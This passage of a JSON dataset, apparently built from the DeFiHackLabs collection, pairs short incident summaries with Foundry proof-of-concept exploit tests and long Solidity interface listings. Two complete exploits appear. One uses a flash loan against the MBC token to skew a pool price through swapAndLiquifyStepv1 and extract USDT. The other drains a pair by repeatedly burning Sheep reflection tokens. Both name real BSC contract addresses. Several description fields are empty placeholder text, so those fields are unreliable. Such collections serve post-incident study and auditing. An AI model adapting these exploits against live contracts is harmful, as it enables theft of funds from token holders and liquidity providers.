compLikeDelegatee) external;\n\n  function _reduceReserves(uint256 reduceAmount) external returns (uint256);\n\n  function _resignImplementation() external;\n\n  function _setComptroller(address newComptroller) external returns (uint256);\n\n  function _setInterestRateModel(address newInterestRateModel)\n  external\n  returns (uint256);\n\n  function _setPendingAdmin(address newPendingAdmin) external returns (uint256);\n\n  function _setReserveFactor(uint256 newReserveFactorMantissa)\n  external\n  returns (uint256);\n\n  function accrualBlockNumber() external view returns (uint256);\n\n  function accrueInterest() external returns (uint256);\n\n  function admin() external view returns (address);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function balanceOfUnderlying(address owner) external returns (uint256);\n\n  function borrow(uint256 borrowAmount) external returns (uint256);\n\n  function borrowBalanceCurrent(address account) external returns (uint256);\n\n  function borrowBalanceStored(address account) external view returns (uint256);\n\n  function borrowIndex() external view returns (uint256);\n\n  function borrowRatePerBlock() external view returns (uint256);\n\n  function comptroller() external view returns (address);\n\n  function decimals() external view returns (uint8);\n\n  function exchangeRateCurrent() external returns (uint256);\n\n  function exchangeRateStored() external view returns (uint256);\n\n  function getAccountSnapshot(address account)\n  external\n  view\n  returns (\n    uint256,\n    uint256,\n    uint256,\n    uint256\n  );\n\n  function getCash() external view returns (uint256);\n\n  function implementation() external view returns (address);\n\n  function initialize(\n    address underlying_,\n    address comptroller_,\n    address interestRateModel_,\n    uint256 initialExchangeRateMantissa_,\n    string memory name_,\n    string memory symbol_,\n    uint8 decimals_\n  ) external;\n\n  function initialize(\n    address comptroller_,\n    address interestRateModel_,\n    uint256 initialExchangeRateMantissa_,\n    string memory name_,\n    string memory symbol_,\n    uint8 decimals_\n  ) external;\n\n  function interestRateModel() external view returns (address);\n\n  function isCToken() external view returns (bool);\n\n  function liquidateBorrow(\n    address borrower,\n    uint256 repayAmount,\n    address cTokenCollateral\n  ) external returns (uint256);\n\n  function mint(uint256 mintAmount) external returns (uint256);\n\n  function name() external view returns (string memory);\n\n  function pendingAdmin() external view returns (address);\n\n  function protocolSeizeShareMantissa() external view returns (uint256);\n\n  function redeem(uint256 redeemTokens) external returns (uint256);\n\n  function redeemUnderlying(uint256 redeemAmount) external returns (uint256);\n\n  function repayBorrow(uint256 repayAmount) external returns (uint256);\n\n  function repayBorrowBehalf(address borrower, uint256 repayAmount)\n  external\n  returns (uint256);\n\n  function reserveFactorMantissa() external view returns (uint256);\n\n  function seize(\n    address liquidator,\n    address borrower,\n    uint256 seizeTokens\n  ) external returns (uint256);\n\n  function supplyRatePerBlock() external view returns (uint256);\n\n  function sweepToken(address token) external;\n\n  function symbol() external view returns (string memory);\n\n  function totalBorrows() external view returns (uint256);\n\n  function totalBorrowsCurrent() external returns (uint256);\n\n  function totalReserves() external view returns (uint256);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address dst, uint256 amount) external returns (bool);\n\n  function transferFrom(\n    address src,\n    address dst,\n    uint256 amount\n  ) external returns (bool);\n\n  function underlying() external view returns (address);\n}\n",
                        "token_count": 1282,
                        "imported": true
                    },
                    {
                        "name": "IUnitroller",
                        "content": "interface IUnitroller {\n  function enterMarkets(address[] memory cTokens)\n  external\n  returns (uint256[] memory);\n\n  function exitMarket(address cTokenAddress) external returns (uint256);\n\n  function cTokensByUnderlying(address) external view returns (address);\n\n  function getAccountLiquidity(address account)\n  external\n  view\n  returns (\n    uint256,\n    uint256,\n    uint256\n  );\n\n  function borrowCaps(address) external view returns (uint256);\n  function getAllMarkets() external view returns (address[] memory);\n}\n",
                        "token_count": 118,
                        "imported": true
                    },
                    {
                        "name": "IAaveFlashloan",
                        "content": "interface IAaveFlashloan {\n    function flashLoan(\n        address receiverAddress,\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata modes,\n        address onBehalfOf,\n        bytes calldata params,\n        uint16 referralCode\n    ) external;\n     function flashLoanSimple(\n    address receiverAddress,\n    address asset,\n    uint256 amount,\n    bytes calldata params,\n    uint16 referralCode\n  ) external;\n}\n",
                        "token_count": 99,
                        "imported": true
                    },
                    {
                        "name": "IWFTM",
                        "content": "interface IWFTM is IERC20Metadata {\n  event Deposit(address indexed dst, uint wad);\n  event Withdrawal(address indexed src, uint wad);\n  receive() external payable;\n  fallback () external payable;\n  function deposit() external payable;\n  function withdraw(uint wad) external;\n}\n",
                        "token_count": 62,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "5fa4a107cd",
        "is_ready": false,
        "content": "### 20221129 - MBC - Business Logic Flaw & Access Control\n### Lost $5.6k\n#### Contract\n[MBC_exp.sol](src/test/MBC_exp.sol)\n#### Link reference\nhttps://twitter.com/AnciliaInc/status/1597742575623888896\nhttps://twitter.com/CertiKAlert/status/1597639717096460288",
        "date": "20221129",
        "target": "MBC",
        "attack_title": "Business Logic Flaw & Access Control",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/AnciliaInc/status/1597742575623888896",
                "content": "content of the link"
            },
            {
                "link": "https://twitter.com/CertiKAlert/status/1597639717096460288",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/MBC_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @Analysis\n// https://twitter.com/AnciliaInc/status/1597742575623888896\n// https://twitter.com/CertiKAlert/status/1597639717096460288\n// @TX\ninterface IMBC is IERC20 {\n   function swapAndLiquifyStepv1() external;\n}\ncontract ContractTest is DSTest {\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);\n    IMBC MBC = IMBC(0x4E87880A72f6896E7e0a635A5838fFc89b13bd17);\n    address dodo = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    uint dodoFlahloanAmount;\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23474460);\n    }\n    function testExploit() public {\n        USDT.approve(address(Router), type(uint256).max);\n        MBC.approve(address(Router), type(uint256).max);\n        dodoFlahloanAmount = USDT.balanceOf(dodo);\n        DVM(dodo).flashLoan(0,\n            dodoFlahloanAmount,\n            address(this),\n            new bytes(1));\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18);\n    }\n    function DPPFlashLoanCall(address sender,\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        bytes calldata data) external {\n        // Intial rate MBC/USDT -> 1.1365032200116891/1\n        // Pair getReserves -> 12475110456913920021663 / 10976748888389080860664\n        address[] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(MBC);\n        uint[] memory values = Router.getAmountsOut(150_000 * 10**18, path);\n        USDT.transfer(address(Pair), 150_000 * 10**18);\n        Pair.swap(values[1],\n            0,\n            address(this),\n            \"\");\n        MBC.swapAndLiquifyStepv1();\n        Pair.sync();\n        // Altered rate MBC/USDT -> 0.0052991665156216445/1\n        // Pair getReserves -> 900258815097978209431 / 169886870405763976494888\n        USDT.transfer(address(Pair), 1001); // function() _isAddLiquidityV1()\n        MBC.transfer(address(Pair), MBC.balanceOf(address(this)));\n        (uint MBCReserve, uint USDTReserve,) = Pair.getReserves();\n        uint amountIn = MBC.balanceOf(address(Pair)) - MBCReserve;\n        path[0] = address(MBC);\n        path[1] = address(USDT); \n        values = Router.getAmountsOut(amountIn, path);\n        Pair.swap(0,\n            values[1],\n            address(this),\n            \"\");\n        USDT.transfer(dodo, dodoFlahloanAmount);\n    }\n}",
                "token_count": 889,
                "interfaces": [
                    {
                        "name": "IMBC",
                        "content": "interface IMBC is IERC20 {\n   function swapAndLiquifyStepv1() external;\n}\n",
                        "token_count": 22,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "Uni_Pair_V2",
                        "content": "interface Uni_Pair_V2 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function MINIMUM_LIQUIDITY() external view returns (uint256);\n\n  function PERMIT_TYPEHASH() external view returns (bytes32);\n\n  function allowance(address, address) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function decimals() external view returns (uint8);\n\n  function factory() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 _reserve0,\n    uint112 _reserve1,\n    uint32 _blockTimestampLast\n  );\n\n  function initialize(address _token0, address _token1) external;\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function name() external view returns (string memory);\n\n  function nonces(address) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function skim(address to) external;\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes memory data\n  ) external;\n\n  function symbol() external view returns (string memory);\n\n  function sync() external;\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n}\n",
                        "token_count": 569,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V2",
                        "content": "interface Uni_Router_V2 {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  // receive () external payable;\n}\n",
                        "token_count": 1172,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "64bbd5dc05",
        "is_ready": false,
        "content": "### 20230210 - Sheep - Reflection token\n### Lost: ~$3K\n#### Contract\n[Sheep_exp.sol](src/test/Sheep_exp.sol)\n#### Link Reference\nhttps://twitter.com/BlockSecTeam/status/1623999717482045440\nhttps://twitter.com/BlockSecTeam/status/1624077078852210691",
        "date": "20230210",
        "target": "Sheep",
        "attack_title": "Reflection token",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/BlockSecTeam/status/1623999717482045440",
                "content": "content of the link"
            },
            {
                "link": "https://twitter.com/BlockSecTeam/status/1624077078852210691",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/Sheep_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1623999717482045440\n// https://twitter.com/BlockSecTeam/status/1624077078852210691\n// @TX\n// https://bscscan.com/tx/0x61293c6dd5211a98f1a26c9f6821146e12fb5e20c850ad3ed2528195c8d4c98e\n// Related Events\n// https://github.com/SunWeb3Sec/DeFiHackLabs/#20230207---fdp---reflection-token\n// https://github.com/SunWeb3Sec/DeFiHackLabs/#20230126---tinu---reflection-token\ninterface RDeflationERC20 is IERC20 {\n    function burn(uint256 amount) external;\n}\ncontract ContractTest is Test {\n    RDeflationERC20 SHEEP = RDeflationERC20(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24);\n    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 25_543_755);\n    }\n    function testExploit() public {\n        DVM(dodo).flashLoan(380 * 1e18, 0, address(this), new bytes(1));\n        emit log_named_decimal_uint(\"Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        WBNBToSHEEP();\n        while (SHEEP.balanceOf(address(Pair)) > 2) {\n            uint256 burnAmount = SHEEP.balanceOf(address(this));\n            SHEEP.burn(burnAmount);\n        }\n        Pair.sync();\n        SHEEPToWBNB();\n        WBNB.transfer(dodo, 380 * 1e18);\n    }\n    function WBNBToSHEEP() internal {\n        WBNB.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(SHEEP);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp);\n    }\n    function SHEEPToWBNB() internal {\n        SHEEP.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(SHEEP);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(SHEEP.balanceOf(address(this)), 0, path, address(this), block.timestamp);\n    }\n}",
                "token_count": 835,
                "interfaces": [
                    {
                        "name": "RDeflationERC20",
                        "content": "interface RDeflationERC20 is IERC20 {\n    function burn(uint256 amount) external;\n}\n",
                        "token_count": 21,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, 